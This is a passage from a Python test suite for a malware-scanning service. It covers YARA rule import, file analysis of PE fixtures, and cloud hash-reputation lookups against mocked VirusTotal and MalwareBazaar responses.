    d = env / "work" / "ruleset"
    (d / "sub").mkdir(parents=True)
    (d / "a.yar").write_text('rule Imp_A { strings: $a = "IMPORT-A" condition: $a }')
    (d / "sub" / "b.yara").write_text('rule Imp_B { condition: filesize == 3 }')
    (d / "broken.yar").write_text("rule { }")
    (d / "notes.md").write_text("ignored")
    r = c.post("/api/rules/import", json={"path": str(d)}).json()
    assert r["files"] == 3 and len(r["imported"]) == 2 and len(r["failed"]) == 1 and r["rules"] == 2
    names = {x["name"] for x in c.get("/api/rules").json()["items"]}
    assert {"ruleset/a", "ruleset/sub/b"} <= names
    z = env / "work" / "forge.zip"
    with zipfile.ZipFile(z, "w") as zf:
        zf.writestr("packages/core/x.yar", 'rule Zip_X { strings: $x = "ZIP-X" condition: $x }')
    r = c.post("/api/rules/import", json={"path": str(z), "prefix": "forge"}).json()
    assert r["imported"][0]["name"] == "forge" and r["rules"] == 1
    assert "Zip_X" in [m["rule"] for m in analyze(c, b"ZIP-X", "a")["yara"]["matches"]]
    r = c.post("/api/rules/import", json={"path": str(z), "prefix": "forge"}).json()   # re-import replaces
    assert len(r["imported"]) == 1
    assert c.post("/api/rules/import", json={"path": str(env / "nope")}).status_code == 404


def test_module_rules_need_native(env, monkeypatch):
    monkeypatch.setenv("CYBERHUB_YARA_BACKEND", "lite")
    with TestClient(create_app(Settings(), start_workers=False)) as cl:
        _login(cl)
        src = 'import "pe"\nrule Many_Sections { condition: pe.number_of_sections > 10 }'
        r = cl.post("/api/rules", json={"name": "pe rules", "source": src})
        assert r.status_code == 201
        s = r.json()
        assert s["status"] == "unsupported" and not s["active"] and "native YARA" in s["error"]
        assert cl.get("/api/rules/status").json()["sets_by_status"]["unsupported"] == 1
    if HAVE_YARA:
        monkeypatch.setenv("CYBERHUB_YARA_BACKEND", "native")
        with TestClient(create_app(Settings(), start_workers=False)) as cl:
            _login(cl)
            s = next(x for x in cl.get("/api/rules").json()["items"] if x["name"] == "pe rules")
            assert s["status"] == "ok" and s["active"]            # same DB, re-validated with libyara


def test_analyze_file_on_disk(c, env):
    f = env / "work" / "setup.exe"
    f.write_bytes(packed_pe())
    r = c.post("/api/rules/analyze", json={"path": str(f), "lookup": True}).json()
    assert r["sha256"] == hashlib.sha256(packed_pe()).hexdigest() and r["path"] == str(f)
    assert r["file_type"] == "pe" and r["pe"]["machine"] == "x86" and r["malicious"]
    assert r["reputation"] == [] and r["signature_match"] is None
    assert c.post("/api/rules/analyze", json={"path": str(env / "work")}).status_code == 422
    assert c.post("/api/rules/analyze", json={"path": str(env / "nope.exe")}).status_code == 404
    assert c.post("/api/rules/analyze", json={}).status_code == 422
    assert c.post("/api/rules/analyze", json={"content_base64": "***", "name": "x"}).status_code == 422
    # a known hash wins over everything else
    from cyberhub.services.malware_db import EICAR
    r = analyze(c, EICAR, "eicar.com")
    assert r["verdict"]["method"] == "hash" and r["signature_match"]


def test_big_files_get_name_checks_only(c, env):
    c.patch("/api/settings", json={"rules_max_file_mb": 1})
    f = env / "work" / "movie.mp4"
    f.write_bytes(normal_pe() + os.urandom(2 * 1024 * 1024))
    j = scan(c, f)
    assert j["threats_found"] == 1                               # disguised executable (header check)
    d = c.get("/api/rules/detections").json()["items"][0]
    assert d["threat_name"].endswith("DisguisedExecutable")


# ====================================================================== online lookup
class FakeCloud:
    def __init__(self):
        self.calls = []
        self.vt, self.mb, self.vt_status = {}, set(), None

    def __call__(self, method, url, headers, data, timeout):
        self.calls.append((method, url, dict(headers)))
        if "virustotal" in url:
            assert headers["x-apikey"] == "V" * 64
            if self.vt_status:
                return self.vt_status, b"{}"
            h = url.rsplit("/", 1)[1]
            if h in self.vt:
                return 200, json.dumps({"data": {"attributes": self.vt[h]}}).encode()
            return 404, b'{"error": {"code": "NotFoundError"}}'
        assert headers["Auth-Key"] == "M" * 48
        h = urllib.parse.parse_qs(data.decode())["hash"][0]
        if h in self.mb:
            return 200, json.dumps({"query_status": "ok", "data": [{"sha256_hash": h, "signature": "AgentTesla",
                                                                     "file_type": "exe", "tags": ["stealer"],
                                                                     "first_seen": "2026-01-01 10:00:00"}]}).encode()
        return 200, b'{"query_status": "hash_not_found"}'


def vt_attr(h, mal, total=70, label="trojan.agent/generic"):
    return {"sha256": h, "last_analysis_stats": {"malicious": mal, "suspicious": 0, "undetected": total - mal,
                                                 "harmless": 0},
            "popular_threat_classification": {"suggested_threat_label": label}, "meaningful_name": "x.exe",
            "type_description": "Win32 EXE", "first_submission_date": 1700000000}


@pytest.fixture()
def cloud(c):
    fake = FakeCloud()
    c.app.state.cloud.transport = fake
    return fake


def test_keys_are_encrypted_and_never_returned(c, cloud):
    st = c.get("/api/lookup/status").json()
    assert not st["enabled"] and not st["ready"] and "never leave" in st["privacy"]
    r = c.put("/api/lookup/keys", json={"virustotal": "V" * 64, "malwarebazaar": "M" * 48})
    assert r.status_code == 200
    body = json.dumps(r.json())
    assert "V" * 64 not in body and "M" * 48 not in body
    assert r.json()["providers"]["virustotal"]["key_hint"] == "…VVVV" and r.json()["ready"]
    row = c.app.state.db.fetchone("SELECT wrapped FROM cloud_api_keys WHERE provider='virustotal'")
    assert "VVVV" not in row["wrapped"]
    assert c.app.state.cloud._key("virustotal") == "V" * 64
    assert c.put("/api/lookup/keys", json={"virustotal": "short"}).status_code == 422
    assert c.put("/api/lookup/keys", json={}).status_code == 422
    std = standard_user(c)
    assert c.put("/api/lookup/keys", json={"virustotal": "X" * 40}, headers=std).status_code == 403
    assert c.get("/api/lookup/status", headers=std).status_code == 200
    c.put("/api/lookup/keys", json={"malwarebazaar": ""})
    assert not c.get("/api/lookup/status").json()["providers"]["malwarebazaar"]["key_set"]


def test_lookup_hash_cache_and_learning(c, cloud):
    bad = hashlib.sha256(b"cloud-known-bad").hexdigest()
    cloud.vt[bad] = vt_attr(bad, 52)
    assert c.post("/api/lookup/hash", json={"hash": bad}).status_code == 409          # off by default
    c.patch("/api/settings", json={"cloud_lookup_enabled": True})
    assert c.post("/api/lookup/hash", json={"hash": bad}).status_code == 409          # no key yet
    c.put("/api/lookup/keys", json={"virustotal": "V" * 64, "malwarebazaar": "M" * 48})
    r = c.post("/api/lookup/hash", json={"hash": bad}).json()
    assert r["verdict"] == "malicious" and r["threat_label"] == "trojan.agent/generic"
    vt = r["providers"]["virustotal"]
    assert vt["malicious"] == 52 and vt["total"] == 70 and not vt["cached"]
    assert r["providers"]["malwarebazaar"]["verdict"] == "unknown"
    sig = c.app.state.malware_db.get(bad)                                         # learned for offline use
    assert sig and sig["source"] == "cloud:virustotal" and sig["name"] == "trojan.agent/generic"
    n = len(cloud.calls)
    r2 = c.post("/api/lookup/hash", json={"hash": bad}).json()
    assert len(cloud.calls) == n and r2["providers"]["virustotal"]["cached"]
    c.post("/api/lookup/hash", json={"hash": bad, "force": True, "providers": ["virustotal"]})
    assert len(cloud.calls) == n + 1
    mb = hashlib.sha256(b"mb-only").hexdigest()
    cloud.mb.add(mb)
    r = c.post("/api/lookup/hash", json={"hash": mb}).json()
    assert r["verdict"] == "malicious" and r["providers"]["malwarebazaar"]["threat_label"] == "AgentTesla"
    low = hashlib.sha256(b"one-engine").hexdigest()
    cloud.vt[low] = vt_attr(low, 1)
    assert c.post("/api/lookup/hash", json={"hash": low}).json()["verdict"] == "suspicious"
    h = c.get("/api/lookup/history?verdict=malicious").json()
    assert h["total"] == 2
    assert c.post("/api/lookup/hash", json={"hash": "zz" * 32}).status_code == 422
    assert c.delete("/api/lookup/cache").json()["deleted"] >= 4


def test_rate_limits_and_errors(c, cloud):
    c.patch("/api/settings", json={"cloud_lookup_enabled": True, "cloud_vt_per_minute": 2})
    c.put("/api/lookup/keys", json={"virustotal": "V" * 64})
    hs = [hashlib.sha256(bytes([i])).hexdigest() for i in range(3)]
    assert c.post("/api/lookup/hash", json={"hash": hs[0]}).json()["verdict"] == "unknown"
    assert c.post("/api/lookup/hash", json={"hash": hs[1]}).status_code == 200
    r = c.post("/api/lookup/hash", json={"hash": hs[2]})
    assert r.status_code == 429 and int(r.headers["retry-after"]) > 0
    assert c.get("/api/lookup/status").json()["providers"]["virustotal"]["requests_today"] == 2
    c.app.state.cloud._recent["virustotal"].clear()
    cloud.vt_status = 401
    r = c.post("/api/lookup/hash", json={"hash": hs[2]})
    assert r.status_code == 401 and "API key" in r.json()["detail"]
    cloud.vt_status = 429
    c.app.state.cloud._recent["virustotal"].clear()
    assert c.post("/api/lookup/hash", json={"hash": hs[2]}).status_code == 429
    assert c.get("/api/lookup/status").json()["providers"]["virustotal"]["paused_seconds"] > 0
    t = c.post("/api/lookup/test").json()
    assert t["virustotal"]["ok"] is False


def test_background_lookup_turns_into_detection(c, cloud, env):
    c.patch("/api/settings", json={"cloud_lookup_enabled": True, "cloud_auto_lookup": "executables"})
    c.put("/api/lookup/keys", json={"virustotal": "V" * 64})
    exe = env / "work" / "free-game.exe"
    content = b"MZ-not-really-but-new-to-us" + os.urandom(64)
    exe.write_bytes(content)
    txt = env / "work" / "notes.txt"
    txt.write_text("not an executable")
    sha = hashlib.sha256(content).hexdigest()
    cloud.vt[sha] = vt_attr(sha, 40, label="trojan.stealer/redline")
    j = scan(c, exe, txt)
    assert j["threats_found"] == 0
    st = c.get("/api/lookup/status").json()
    assert st["queue"] == 1                                       # only the program, not the text file
    r = c.post("/api/lookup/queue/run").json()
    assert r["processed"] == 1 and r["remaining"] == 0
    det = c.get("/api/rules/detections?method=cloud").json()["items"][0]
    assert det["threat_name"] == "Cloud:trojan.stealer/redline" and det["severity"] == "high"
    assert det["details"]["providers"]["virustotal"]["malicious"] == 40
    assert scan(c, exe)["threats_found"] == 1                     # now known offline (learned signature)
    assert c.get("/api/scan/detections").json()["items"][0]["method"] == "hash"
    # files that changed after being queued are not reported
    other = env / "work" / "tool.exe"
    other.write_bytes(b"version 1")
    scan(c, other)
    other.write_bytes(b"version 2")
    sha1 = hashlib.sha256(b"version 1").hexdigest()
    cloud.vt[sha1] = vt_attr(sha1, 30)
    c.post("/api/lookup/queue/run")
    assert c.get("/api/rules/detections?method=cloud").json()["total"] == 1


# ====================================================================== migration
def test_migration_from_v8(tmp_path):
    path = tmp_path / "old.db"
    con = sqlite3.connect(path)
    con.execute("CREATE TABLE schema_version (version INTEGER PRIMARY KEY, description TEXT, applied_at TEXT)")
    for v, d, sql in MIGRATIONS[:8]:
        con.executescript(sql)
        con.execute("INSERT INTO schema_version(version, description) VALUES (?,?)", (v, d))
    con.execute("INSERT INTO scan_detections(path, threat_name, severity, method) VALUES ('/x','T','low','hash')")
    con.commit(); con.close()
    db = Database(path)
    assert db.migrate() >= 9
    row = db.fetchone("SELECT * FROM scan_detections")
    assert row["details"] is None and row["method"] == "hash"
    names = {r["name"] for r in db.fetchall("SELECT name FROM sqlite_master WHERE type='table'")}
    assert {"yara_rule_sets", "rule_verdict_cache", "hash_reputation", "cloud_api_keys", "cloud_usage"} <= names
    db.close()
